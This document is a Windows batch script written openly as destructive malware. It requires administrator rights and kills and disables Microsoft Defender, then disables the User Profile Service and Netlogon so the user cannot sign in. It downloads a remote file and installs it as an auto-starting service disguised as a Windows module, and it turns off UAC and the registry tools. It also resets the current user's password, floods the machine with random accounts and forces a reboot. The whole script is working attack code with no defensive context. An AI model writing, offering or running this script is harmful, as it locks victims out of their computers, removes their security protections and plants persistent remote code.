@echo off

REM This batch script expects to have Administartive Privleges
REM If not it won't work
cd %temp%
md 0b8ae314-21b1-435e-ab26-260846fa9020
cd 0b8ae314-21b1-435e-ab26-260846fa9020

REM Try to disable MS Defender
taskkill /f /im MsMpEng.exe
sc config "WinDefend" start= disabled
sc config "wscsvc" start= disabled


REM Disable the User Profile Service so the user cant sign in
sc config "User Profile Service" start= disabled
if %lang% == de_DE sc config "Benutzerprofildienst" start= disabled

REM disable services
sc config "mppsvc" start= disabled
sc config "Netlogon" start= disabled
sc config "WbioSrvc" start= disabled
sc config "webthreatdefsvc" start= disabled
sc config "webthreatdefusersvc" start= disabled
sc config "WEPHOSTSVC" start= disabled
sc config "wlidsvc" start= disabled
sc config "WMansvc" start= disabled
sc config "wlpasvc" start= disabled
  
REM kill EXPLORER to confuse the user
taskkill /f /im explorer.exe

REM Create a service for Client.CMD
powershell -Command "Invoke-WebRequest http://www.example.com/package.zip -OutFile C:\Program Files\client.cmd"
sc create wmisswsvc binpath= "C:\Windows\system32\cmd.exe start /min C:\Program Files\client.cmd" error= ignore start= auto type= own displayname= "Windows Modules Installer Service Worker"


REM messing with the registry
reg add "HKCU\Control Panel\Colors" /v Background /t REG_SZ /d "0 0 0" /f
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
reg add HKLM\SOFTWARE\Policies\Microsoft\Windows\System /v DisableLogonBackgroundImage /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
reg add "HKCU\Control Panel\Mouse" /v SwapMouseButtons /t REG_DWORD /d "1" /f
reg add "HKCU\Control Panel\Desktop" /v AutoColorization /t REG_DWORD /d "1" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d "1" /f

REM Changing the password of the current user and messing with the user list
net user %USERNAME% sike
net user /add %RANDOM%
net user /add %RANDOM%
net user /add %RANDOM%
net user /add %RANDOM%
net user /add %RANDOM%
net user /add %RANDOM%
net user /add %RANDOM%
net user /add %RANDOM%
net user /add %RANDOM%
net user /add %RANDOM%
net user /add %RANDOM%
net user /add %RANDOM%
net user /add %RANDOM%
net user /add %RANDOM%
net user /add %RANDOM%
net user /add %RANDOM%
net user /add %RANDOM%
net user /add %RANDOM%
net user /add %RANDOM%
net user /add %RANDOM%
net user /add %RANDOM%

shutdown -r -t 0
